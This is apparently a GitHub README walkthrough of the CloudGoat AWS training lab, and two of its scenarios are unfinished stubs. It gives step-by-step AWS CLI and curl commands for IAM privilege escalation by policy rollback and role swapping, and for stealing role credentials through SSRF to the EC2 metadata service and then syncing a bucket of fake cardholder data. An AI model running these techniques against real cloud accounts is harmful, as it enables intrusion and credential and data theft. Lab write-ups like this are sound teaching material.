# cloud-goat_walkthrough
Short Cloud Goat 2.0 Walkthrough with AWS CLI  
This walkthrough only consists of this readme file  

CloudGoat was written by RhinoSecurityLabs. More information can be found here:  
(https://rhinosecuritylabs.com/aws/cloudgoat-vulnerable-design-aws-environment/)

Github's Official CloudGoat link can be found here:  
(https://github.com/RhinoSecurityLabs/cloudgoat)

## Installation
Cloud goat can be installed via Docker, but this guide only covers the AWS installation of CloudGoat.  
This requires a free tier Amazon AWS account. RhinoLabs states that this training may cost $1-3 per day.  
While I cannot guarantee this to be free, I have yet to accrue any costs while using CloudGoat.  
  
Create an aws profile to use for cloudgoat, this example uses the profile **goat**.  
To install CloudGoat, several steps are required as pre-requisites.    
Installation for Windows systems is not included at this time, but detailed installation steps will be included for both Linux and OSX. Leave me feedback requesting this, and I'll get it working on Windows for you.  
  
### Linux Prerequisite Installation
This covers debian based distros  
Your linux distro should already have Python3, but you can verify it is installed from terminal  
1. Verify python3.6+ is installed
`python3` will launch the installed version of python 3 which it will list on the 1st line  
_CTRL+D_ to quit  
2. Install terraform 
`sudo snap install terraform`
3. Verify terraform installation 
`terraform`
4. Install AWS CLI
`sudo apt install awscli`
5. Change the directory to _/opt_ to install cloudgoat   

### OSX Prerequisite Installation
MacOS High Sierra and Mojave both come with Python3.6+   
1. Verify python3.6+ is installed from Terminal  
`python3` will launch the installed version of python 3 which it will list on the 1st line  
CTRL+D to quit   
2. Install terraform   
`brew install terraform`  
3. Verify terraform installation   
`terraform`   
4. Install AWS CLI  
`brew install awscli`   
5. Change the directory to a good location for CloudGoat *~/* seems to work best for a least priv option  


### Cloudgoat Installation
1. Install CloudGoat  
```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
sudo chmod u+x cloudgoat.py
sudo chmod 777 cloudgoat.py
```   
The github documentation states to use pip3 install -r requirements.txt, but I have found that isn't actually necessary for cloudgoat  
2. Create a profile   
`./cloudgoat.py config profile`    
      * Default profile name? __y__     
      * Default AWS profile: __goat__   
3. Configure your system's IP to be on the whitelist   
`./cloudgoat.py config whitelist --auto`   
Now that the installation of the cloudgoat python module is complete, move on to create/remove the scenarios in order.  
4. Create the **goat** profile for AWS CLI   
`aws configure --profile goat`   
      * AWS Access Key ID: __goat account aws_access_key_id__   
      * AWS Secret Access Key: __goat aws_secret_access_key__   
      * Default region name: __us-east-1__   
      * Default output format: __can be left blank__    
    

## iam_privesc_by_rollback
This scenario starts with limited user credentials and escalates to admin privileges by rolling back an iam policy version.   **Scenario Goal: Acquire full admin privileges**  
1. Create scenario  
`./cloudgoat.py create iam_privesc_by_rollback --profile goat`  
2. Document all Outputs information  
e.g.  
   * cloudgoat_output_aws_account_id =  
   * cloudgoat_output_raynor_access_key_id =  
   * cloudgoat_output_raynor_secret_key =  
3. Create the profile for Raynor, the user you need to privesc as  
`aws configure --profile raynor`  
    * AWS Access Key ID: __raynor account aws_access_key_id__   
    * AWS Secret Access Key: __raynor aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
4. List the user policies for Raynor  
`aws iam list-attached-user-policies --user-name raynor --profile raynor`  
5. Document the PolicyArn Value
6. List the versions for the discovered user policy   
`aws iam list-policy-versions --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --profile raynor`   
7. Get information on the policy for all versions
`aws iam get-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v1 --profile raynor`
8. Document the policy version which contains __Allowed Actions: *__ and __Resource: *__  
This demonstrates administrative privileges by allowed all actions to be performed on all resources
9. Set the default policy version to the one containing admin privileges 
aws iam set-default-policy-version --policy-arn arn:aws:iam:666999666999:policy/cg-raynor-policy --version-id v3 --profile Raynor  
10. Verify account authorization details are administrative
`aws iam get-account-authorization-details --profile raynor`
This list will be a bit accessive as the account now has all possible privileges   
**Goal Achieved**

### Remove iam_privesc_by_rollback
There's no reason to leave an overly permissive account lying around. 
1. Remove this scenario with the **destroy** command
`cloudgoat.py destroy all --profile raynor`
2. Remove the created profile
`vim ~/.aws/credentials`   
Type `dd` beside each line to be removed  
Then `:wq` to write and quit  

## iam_privesc_by_attachment
**Scenario Goal: Delete the EC2 instance "cg-super-critical-security-server."**
1. Create scenario  
`./cloudgoat.py create iam_privesc_by_attachment --profile goat`  
2. Document all Outputs information  
3. Create user profile
`aws configure --profile kerrigan`   
    * AWS Access Key ID: __kerrigan account aws_access_key_id__   
    * AWS Secret Access Key: __kerrigan aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
4. View the EC2 instances   
`aws ec2 describe-instances --profile kerrigan`   
5. Document the information concerning the image with the Tag containing "super-critical-security-server EC2 Instance"   
There's only one instance listed, so this is simple   
6. Attempt to stop-instances or terminate-instances   
`aws ec2 stop-instances --instance-ids <instanceID> --region us-east-1 --profile kerrigan`   
`aws ec2 terminate-instances --instance-ids <instanceID> --region us-east-1 --profile kerrigan`   
Since this isn't authorized with this profile an alternate route must be explored   
7. Enumerate instance profiles   
`aws iam list-instance-profiles --profile kerrigan`   
Two of these instance profiles appear to contain AWS access key IDs different than kerrigan's  
8. Enumerate roles  
`aws iam list-roles --profile kerrigan`  
Most of the roles listed grant access to services other than EC2 (RDS, trustedAdvisor, support, etc).  
Look at the profiles and comparing them to the roles. There is a meek profile and role, but no mighty role. Let's fix that!  
9. Remove the meek role from the meek profile   
`aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-x --role-name cg-ec2-meek-role-x --profile kerrigan`  
10. Add the mighty role to the meek profile   
`aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-x --role-name cg-ec2-mighty-role-x --profile kerrigan`  
This change elevates privileges, but not enough to terminate the target.   
However, now we can deploy our own instance. 1st lets find more information about our target. Then we'll create a new EC2 pair to create the instance with and grant us shell access to the new image.  
11. What subnet is the target connected to?  
`aws ec2 describe-subnets --subnet-id <targetSubnetID> --profile kerrigan`   
It's tagged as public subnet, that's convenient.   
12. What Security Groups are associated with the target?  
Further inspection if the Group Names are to be believed, one is for http, and the other is for ssh access
13. Create new EC2 key pair and save it as a .pem file for ssh use   
`aws ec2 create-key-pair --key-name mighty --query 'KeyMaterial' --output text | out-file -encoding ascii -filepath mighty.pem --profile kerrigan`  
`chmod 400 mighty.pem`
14. Create a new EC2 instance with the new keypair, and the subnet/security group IDs that are the same as the target instance
`aws ec2 run-instances --image-id <targetImageID> --instance-type t2.micro --iam-instance-profile Arn=<meekInstanceProfileARN> --key-name mighty --profile kerrigan --subnet-id <subnetID> --security-group-ids <securityGroupID>`
15. Copy the new Instance ID and find it's public IP address 
`aws ec2 describe-instances --instance-id <newInstanceID> --profile kerrigan`
16. SSH into the newly created instance
`ssh -i mighty.pem ubuntu@<publicDNSnameValue>`
17. Install AWS CLI
`sudo apt-get update && apt install awscli`
18. Look at the permissions of the mighty policy
`aws iam get-policy-version --policy-arn <mightArn> --version-id v1`
Now that the new instance contains full admin access the targe instance can be terminated from it
19. `aws ec2 terminate-instances --instance-ids <targetInstanceID> --region us-east-1`   
**Goal Achieved**

### Remove iam_privesc_by_attachment
1. Exit the newly created instance
2. Log into the aws management console site and navigating to Services > EC2
3. Select Running Instances 
4. Check the box beside the running image
5. Select Actions > Instances State > Terminate
6. Click **Yes, Terminate** when the warning that all data will be lost on the instance pops up
7. Click Key Pairs on the left of the screen
8. Ensure the checkbox for the mighty key pair is checked and click Delete
9. Remove the scenario with cloudgoat
`cloudgoat.py destroy iam_privesc_by_attachment --profile goat`
10. Remove the aws cli credentials for Kerrigan 
11. Remove the mighty.pem file
`rm  mighty.pem`

## cloud_breach_s3
**Scenario Goal: Download the confidential files from the S3 bucket**
1. Create scenario  
`./cloudgoat.py create cloud_breach_s3 --profile goat`  
2. Document the Output information, which only include an account id and an ec2 server address   
3. Submit a curl request to the ec2 IP   
`curl -sv http://<ec2IP>`
This contains an H1 header stating the server is configured to proxy requests to the EC2 metadata service. It even contains instruction requred to successfully submit a request.  
The IP 169.254.169.254 is a link-local address used for retrieving metadata. It is meant to be used from an instance to retrieve metadata for that instance. Let's use that as our modified header and see what happens.
4. Submit a metadata curl request
`curl -sv http://<ec2IP>/latest/meta-data/ -H 'Host:169.254.169.254`
This requests reveals a directory structure, iam is an interesting place to start.
5. Submit an iam metadata curl request
`curl -sv http://<ec2IP>/latest/meta-data/iam/ -H 'Host:169.254.169.254`
This results one file called info and a directory called security-credentials
6. Submit and iam info metadata curl request
`curl -sv http://<ec2IP>/latest/meta-data/iam/info -H 'Host:169.254.169.254`
7. Document the results for later and explore the security-credentials folder
`curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254`
8. Continue Enumeration with the WAF Role and copy the secrets it results in
`curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidx -H 'Host:169.254.169.254`
9. Now that we have credentials we can create a role profile   
`aws configure --profile Wrole`    
    * AWS Access Key ID: __WAF Role aws_access_key_id__   
    * AWS Secret Access Key: __WAF Role aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
10. Edit the AWS Credentials file to add the session token  
`vim ~/.aws/credentials`  
`:set paste` Enter  
`i` navigate to the end of the last line then add the session token  
`aws_session_token = <token>`ESC  
`:wq` Enter   
Let's see what these credentials can do  
11. Attempt to list s3 buckets
`aws s3 ls --profile wrole`  
Success! 
13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name    
`aws s3 cp s3://<bucket> ./cardholder --profile wrole`   
That didn't work, maybe we can sync?  
14. Sync the bucket with a local folder   
`aws s3 sync s3://<bucket> ./cardholder --profile wrole`  
**Goal Achieved**
15. Review the new folder for creepy fake PII information
```bash
ls -la cardholder
cat cardholder/cardholder_data_primary.csv
cat cardholder/cardholder_data_secondary.csv
cat cardholder/card
```

### Remove cloud_breach_s3
1. Remove the cardholder folder   
`rm -rf cardholder`  
2. Remove the scenario  
`./cloudgoat destroy cloud_breach_s3 --profile goat` 
3. Remove AWS CLI Credentials for wrole  


## ec2_ssrf
**Scenario Goal: Invoke the "cg-lambda-[CG-ID]" Lambda function**
1. Create scenario  
`./cloudgoat.py create ec2_ssrf --profile goat`  
2. Document the output and create a profile for solus    
`aws configure --profile solus`    
    * AWS Access Key ID: __solus aws_access_key_id__   
    * AWS Secret Access Key: __solus aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__  
3.  Attempt to list the lamda functions   
`aws lambda list-functions --profile solus`   
The listed function contains a service role as well as an ec2 access key id and secret key id   
4. Create a new profile called ec2 with the discovered credentials     
`aws configure --profile ec2`    
    * AWS Access Key ID: __ec2 aws_access_key_id__   
    * AWS Secret Access Key: __ec2 aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__  
5. Now that we have EC2 permissions, lets describe EC2 instances   
`aws ec2 describe-instances --profile ec2`
6. Locate the public IP and navigate to it   
Type error Received, but maybe it's useful     
7. Navigate to the public IP + the URI of one of the listed javascript files    
`http://<publicURL/?url=http://<publicURL>/node_modules/express/lib/router/index.js`   
Result is the portion of a page called "sethsec's SSRF demo"   
8. Attempt to access metadata via the URL SSRF *feature*    
`http://<publicURL/?url=http://169.254.169.254/latest/meta-data`   
9. What a helpful app, attempt discover any security-credentials which may be accessible    
`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
10. Navigate to the resuting role name     
`http://<publicURL/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
11. Document the new credentials and create a new AWS CLI profile     
`aws configure --profile cg`  
    * AWS Access Key ID: __cg-ec2-role aws_access_key_id__   
    * AWS Secret Access Key: __cg-ec2-role aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
12. Edit the AWS Credentials file to add the session token  
`vim ~/.aws/credentials`  
`:set paste` Enter  
`i` navigate to the end of the last line then add the session token  
`aws_session_token = <token>`ESC  
`:wq` Enter   
13. Attempt enumeration of the new profile permissions     
The cg profile doesn't appear to have permmissions for viewing lambda/ec2/iam resources    
14. Attempt to list S3 buckets   
`aws s3 ls --profile cg`   
15. Look for useful information in the secret bucket    
`aws s3 ls s3://<cg-secret-s3-bucket-x> --profile cg`    
16. Copy the file to your current directory    
`aws s3 cp s3://<cg-secret-s3-bucket-x/admin-user.txt ./`
17. Read the file    
`cat admin-user.txt`
18. Create a new profile with the admin-user credentials    
`aws configure --profile admin`   
    * AWS Access Key ID: __admin-user aws_access_key_id__   
    * AWS Secret Access Key: __admin-user aws_secret_access_key__   
    * Default region name: __us-east-1__   
    * Default output format: __leave blank__ 
Try for the goal again, with the **admin** profile
19. Attempt to list lambda functions
`aws lambda list-functions --profile admin`   
So far so good   
20. Attempt to execute the lambda function
`aws lambda invoke --function-name <function-name> --profile admin outfile`
21. Look for and read the outfile
```bash
ls -la 
cat outfile
```
**Goal Achieved**

### Remove ec2_ssrf 
1. Remove all of the files copied or created locally
`rm outfile`   
`rm admin-user.txt`
2. Removed the scenario   
`cloudgoat.py destroy ec2_ssrf --profile goat`   
3. Remove the additional aws profiles: solus, ec2, cg, admin   

## rce_web_app
**Scenario Goal: Find a secret stored in the RDS database**
1. Create scenario   
`./cloudgoat.py create rce_web_app --profile goat`   
2. 


## codebuild_secrets
1. Create scenario  
`./cloudgoat.py create codebuild_secrets --profile goat`  

